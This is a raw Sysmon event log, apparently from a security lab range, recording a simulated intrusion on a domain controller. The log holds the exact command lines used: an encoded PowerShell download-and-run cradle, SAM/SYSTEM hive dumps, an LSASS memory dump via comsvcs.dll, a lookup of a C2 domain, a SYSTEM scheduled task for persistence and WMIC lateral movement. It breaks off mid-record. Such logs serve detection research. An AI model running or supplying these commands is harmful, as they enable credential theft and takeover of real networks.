<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:02.113476300Z'/><EventRecordID>184213</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:02.113</Data><Data Name='ProcessGuid'>{a2359ba1-8caa-609c-1e02-000000000e00}</Data><Data Name='ProcessId'>6248</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"C:\Windows\system32\cmd.exe" /c whoami /priv</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=BF4E12F3BE31D34F5A5B0FB2B04A24E9E13CE5A5CB18A72E36DB8EA6F3F1B0FE</Data><Data Name='ParentProcessGuid'>{a2359ba1-8b9f-609c-1a02-000000000e00}</Data><Data Name='ParentProcessId'>5820</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -nop -w hidden</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:02.556218100Z'/><EventRecordID>184214</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:02.556</Data><Data Name='ProcessGuid'>{a2359ba1-8caa-609c-2002-000000000e00}</Data><Data Name='ProcessId'>3072</Data><Data Name='Image'>C:\Windows\System32\whoami.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>whoami - displays logged on user information</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>whoami.exe</Data><Data Name='CommandLine'>whoami /priv</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=1D191AD4B2EFAF9F5E1D2A2C6F9E7D0B3D6A9F0A5E2C4B8D7F1A3C5E7B9D1F3A</Data><Data Name='ParentProcessGuid'>{a2359ba1-8caa-609c-1e02-000000000e00}</Data><Data Name='ParentProcessId'>6248</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c whoami /priv</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:07.884113900Z'/><EventRecordID>184221</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4028'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:07.883</Data><Data Name='ProcessGuid'>{a2359ba1-8b9f-609c-1a02-000000000e00}</Data><Data Name='ProcessId'>5820</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.1.24</Data><Data Name='SourceHostname'>WIN-DC-01.attackrange.local</Data><Data Name='SourcePort'>50142</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>10.0.1.15</Data><Data Name='DestinationHostname'>WIN-WORKSTATION.attackrange.local</Data><Data Name='DestinationPort'>445</Data><Data Name='DestinationPortName'>microsoft-ds</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:11.203547600Z'/><EventRecordID>184229</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:11.203</Data><Data Name='ProcessGuid'>{a2359ba1-8cb3-609c-2402-000000000e00}</Data><Data Name='ProcessId'>4188</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAxAC4ANQAwAC8AYQAuAHAAcwAxACcAKQA=</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=DE9F8D3C6A1F2E4B7C0A9D8E1F3B5C7A9E2D4F6B8C0A1E3D5F7B9C1A3E5D7F9B</Data><Data Name='ParentProcessGuid'>{a2359ba1-8b9f-609c-1a02-000000000e00}</Data><Data Name='ParentProcessId'>5820</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -nop -w hidden</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:11.451902800Z'/><EventRecordID>184231</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4028'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:11.451</Data><Data Name='ProcessGuid'>{a2359ba1-8cb3-609c-2402-000000000e00}</Data><Data Name='ProcessId'>4188</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.1.24</Data><Data Name='SourceHostname'>WIN-DC-01.attackrange.local</Data><Data Name='SourcePort'>50148</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>10.0.1.50</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>80</Data><Data Name='DestinationPortName'>http</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:12.007654200Z'/><EventRecordID>184234</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4032'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:12.007</Data><Data Name='ProcessGuid'>{a2359ba1-8cb3-609c-2402-000000000e00}</Data><Data Name='ProcessId'>4188</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\svc_backup\AppData\Local\Temp\a.ps1</Data><Data Name='CreationUtcTime'>2021-05-13 09:14:12.007</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:18.664201500Z'/><EventRecordID>184240</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:18.664</Data><Data Name='ProcessGuid'>{a2359ba1-8cba-609c-2802-000000000e00}</Data><Data Name='ProcessId'>2540</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>reg save HKLM\SAM C:\Users\svc_backup\AppData\Local\Temp\sam.hive</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=C7A9E2D4F6B8C0A1E3D5F7B9C1A3E5D7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9</Data><Data Name='ParentProcessGuid'>{a2359ba1-8cb3-609c-2402-000000000e00}</Data><Data Name='ParentProcessId'>4188</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -nop -w hidden -enc SQBFAFgA</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:19.118773400Z'/><EventRecordID>184242</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:19.118</Data><Data Name='ProcessGuid'>{a2359ba1-8cbb-609c-2c02-000000000e00}</Data><Data Name='ProcessId'>6612</Data><Data Name='Image'>C:\Windows\System32\reg.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Registry Console Tool</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>reg.exe</Data><Data Name='CommandLine'>reg save HKLM\SYSTEM C:\Users\svc_backup\AppData\Local\Temp\system.hive</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=E9F1B3D5A7C9E1F3B5D7A9C1E3F5B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1</Data><Data Name='ParentProcessGuid'>{a2359ba1-8cb3-609c-2402-000000000e00}</Data><Data Name='ParentProcessId'>4188</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -nop -w hidden -enc SQBFAFgA</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:24.219886500Z'/><EventRecordID>184248</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:24.219</Data><Data Name='ProcessGuid'>{a2359ba1-8cc2-609c-3002-000000000e00}</Data><Data Name='ProcessId'>7176</Data><Data Name='Image'>C:\Users\svc_backup\AppData\Local\Temp\rundll32.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Windows host process (Rundll32)</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>RUNDLL32.EXE</Data><Data Name='CommandLine'>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 664 C:\Users\svc_backup\AppData\Local\Temp\lsass.dmp full</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\AppData\Local\Temp\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=A1E3D5F7B9C1A3E5D7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9C1E3F5B7D9A1C3</Data><Data Name='ParentProcessGuid'>{a2359ba1-8cb3-609c-2402-000000000e00}</Data><Data Name='ParentProcessId'>4188</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -nop -w hidden -enc SQBFAFgA</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:24.775410200Z'/><EventRecordID>184250</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4036'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>technique_id=T1003.001,technique_name=LSASS Memory</Data><Data Name='UtcTime'>2021-05-13 09:14:24.775</Data><Data Name='SourceProcessGUID'>{a2359ba1-8cc2-609c-3002-000000000e00}</Data><Data Name='SourceProcessId'>7176</Data><Data Name='SourceThreadId'>7960</Data><Data Name='SourceImage'>C:\Users\svc_backup\AppData\Local\Temp\rundll32.exe</Data><Data Name='TargetProcessGUID'>{a2359ba1-8b8e-609c-0c00-000000000e00}</Data><Data Name='TargetProcessId'>664</Data><Data Name='TargetImage'>C:\Windows\system32\lsass.exe</Data><Data Name='GrantedAccess'>0x1010</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+9c534|C:\Windows\System32\KERNELBASE.dll+2a1ad|UNKNOWN(0000000005B41A3C)</Data><Data Name='SourceUser'>ATTACKRANGE\svc_backup</Data><Data Name='TargetUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:25.331067800Z'/><EventRecordID>184253</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4032'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:25.331</Data><Data Name='ProcessGuid'>{a2359ba1-8cc2-609c-3002-000000000e00}</Data><Data Name='ProcessId'>7176</Data><Data Name='Image'>C:\Users\svc_backup\AppData\Local\Temp\rundll32.exe</Data><Data Name='TargetFilename'>C:\Users\svc_backup\AppData\Local\Temp\lsass.dmp</Data><Data Name='CreationUtcTime'>2021-05-13 09:14:25.331</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:31.902334100Z'/><EventRecordID>184261</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:31.902</Data><Data Name='ProcessGuid'>{a2359ba1-8cc9-609c-3402-000000000e00}</Data><Data Name='ProcessId'>3884</Data><Data Name='Image'>C:\Windows\System32\net.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Net Command</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>net.exe</Data><Data Name='CommandLine'>net group "Domain Admins" /domain</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=F3B5D7A9C1E3F5B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5</Data><Data Name='ParentProcessGuid'>{a2359ba1-8caa-609c-1e02-000000000e00}</Data><Data Name='ParentProcessId'>6248</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c net group "Domain Admins" /domain</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:32.447120600Z'/><EventRecordID>184263</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:32.447</Data><Data Name='ProcessGuid'>{a2359ba1-8cca-609c-3802-000000000e00}</Data><Data Name='ProcessId'>1420</Data><Data Name='Image'>C:\Windows\System32\nltest.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>NL Test Main Executable</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>nltest.exe</Data><Data Name='CommandLine'>nltest /dclist:attackrange.local</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=B5D7A9C1E3F5B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7</Data><Data Name='ParentProcessGuid'>{a2359ba1-8caa-609c-1e02-000000000e00}</Data><Data Name='ParentProcessId'>6248</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c nltest /dclist:attackrange.local</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>22</EventID><Version>5</Version><Level>4</Level><Task>22</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:33.005991700Z'/><EventRecordID>184266</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4040'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:33.005</Data><Data Name='ProcessGuid'>{a2359ba1-8cb3-609c-2402-000000000e00}</Data><Data Name='ProcessId'>4188</Data><Data Name='QueryName'>c2.attacker-infra.example</Data><Data Name='QueryStatus'>0</Data><Data Name='QueryResults'>type:  5 c2cdn.attacker-infra.example;::ffff:10.0.1.50;</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:40.663778200Z'/><EventRecordID>184275</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:40.663</Data><Data Name='ProcessGuid'>{a2359ba1-8cd2-609c-3c02-000000000e00}</Data><Data Name='ProcessId'>5016</Data><Data Name='Image'>C:\Windows\System32\schtasks.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>Task Scheduler Configuration Tool</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>schtasks.exe</Data><Data Name='CommandLine'>schtasks /create /tn "Updater" /tr "powershell -nop -w hidden -enc SQBFAFgA" /sc onlogon /ru SYSTEM</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data Name='LogonGuid'>{a2359ba1-8ba0-609c-3577-1c0000000000}</Data><Data Name='LogonId'>0x1c7735</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=D7A9C1E3F5B7D9A1C3E5F7B9D1A3C5E7F9B1D3A5C7E9F1B3D5A7C9E1F3B5D7A9</Data><Data Name='ParentProcessGuid'>{a2359ba1-8cb3-609c-2402-000000000e00}</Data><Data Name='ParentProcessId'>4188</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -nop -w hidden -enc SQBFAFgA</Data><Data Name='ParentUser'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:41.221458300Z'/><EventRecordID>184278</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4044'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2021-05-13 09:14:41.221</Data><Data Name='ProcessGuid'>{a2359ba1-8cd2-609c-3c02-000000000e00}</Data><Data Name='ProcessId'>5016</Data><Data Name='Image'>C:\Windows\System32\schtasks.exe</Data><Data Name='TargetObject'>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Updater\Id</Data><Data Name='Details'>{B2A1C3D4-E5F6-7A8B-9C0D-1E2F3A4B5C6D}</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-05-13T09:14:49.884662100Z'/><EventRecordID>184287</EventRecordID><Correlation/><Execution ProcessID='3196' ThreadID='4020'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WIN-DC-01.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-05-13 09:14:49.884</Data><Data Name='ProcessGuid'>{a2359ba1-8cdb-609c-4002-000000000e00}</Data><Data Name='ProcessId'>2216</Data><Data Name='Image'>C:\Windows\System32\wbem\WMIC.exe</Data><Data Name='FileVersion'>10.0.17763.1</Data><Data Name='Description'>WMI Commandline Utility</Data><Data Name='Product'>Microsoft Windows Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>wmic.exe</Data><Data Name='CommandLine'>wmic /node:10.0.1.15 process call create "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA"</Data><Data Name='CurrentDirectory'>C:\Users\svc_backup\</Data><Data Name='User'>ATTACKRANGE\svc_backup</Data><Data 